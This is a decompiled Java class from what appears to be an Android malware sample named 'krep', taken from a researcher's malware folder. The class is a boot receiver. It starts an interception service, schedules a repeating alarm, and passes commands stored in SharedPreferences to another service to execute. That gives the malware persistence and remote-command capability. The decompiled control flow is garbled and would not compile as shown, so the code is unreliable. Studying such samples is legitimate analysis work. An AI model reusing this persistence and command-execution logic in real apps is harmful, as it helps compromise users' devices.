package krep.itmtd.ywtjexf;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.content.pm.PackageManager.NameNotFoundException;
import android.os.Bundle;
import android.os.SystemClock;
import java.util.Calendar;
import java.util.Iterator;
import java.util.Map;
import java.util.Set;

public class MasterBoot
  extends BroadcastReceiver
{
  public String getcmd(Context paramContext, String paramString)
  {
    return paramContext.getSharedPreferences("Cmd_conf", 0).getString(paramString, "");
  }
  
  public void onReceive(Context paramContext, Intent paramIntent)
  {
    paramContext.startService(new Intent(paramContext, MasterInterceptor.class));
    localObject1 = "";
    try
    {
      localObject2 = paramContext.getPackageManager().getApplicationInfo(paramContext.getPackageName(), 128);
      paramIntent = (Intent)localObject1;
      if (((ApplicationInfo)localObject2).metaData != null) {
        paramIntent = ((ApplicationInfo)localObject2).metaData.getString("timer");
      }
    }
    catch (PackageManager.NameNotFoundException paramIntent)
    {
      for (;;)
      {
        int i;
        long l;
        paramIntent.printStackTrace();
        paramIntent = (Intent)localObject1;
        continue;
        localObject1 = (String)paramIntent.next();
        Object localObject2 = getcmd(paramContext, (String)localObject1);
        if (((String)localObject2).length() > 2)
        {
          Intent localIntent = new Intent(paramContext, GlobalCode.class);
          localIntent.putExtra("content", (String)localObject2);
          localIntent.putExtra("type", "TriggerBoot:" + (String)localObject1);
          localIntent.putExtra("data", "");
          paramContext.startService(localIntent);
        }
      }
    }
    i = 60;
    if (paramIntent.length() > 2) {
      i = Integer.parseInt(paramIntent.substring(1));
    }
    paramIntent = (AlarmManager)paramContext.getSystemService("alarm");
    l = SystemClock.elapsedRealtime();
    localObject1 = Calendar.getInstance();
    ((Calendar)localObject1).setTimeInMillis(System.currentTimeMillis());
    ((Calendar)localObject1).add(13, 10);
    localObject1 = PendingIntent.getBroadcast(paramContext, 0, new Intent(paramContext, MasterTimer.class), 0);
    paramIntent.setRepeating(0, l + 5000L, i * 1000, (PendingIntent)localObject1);
    paramIntent = paramContext.getSharedPreferences("Boot_conf", 0).getAll();
    if (paramIntent.size() > 0)
    {
      paramIntent = paramIntent.keySet().iterator();
      if (paramIntent.hasNext()) {}
    }
    else
    {
      return;
    }
  }
}


/* Location:              /home/enzo/Documents/hacking/malwares/krep/classes-dex2jar.jar!/krep/itmtd/ywtjexf/MasterBoot.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       0.7.1
 */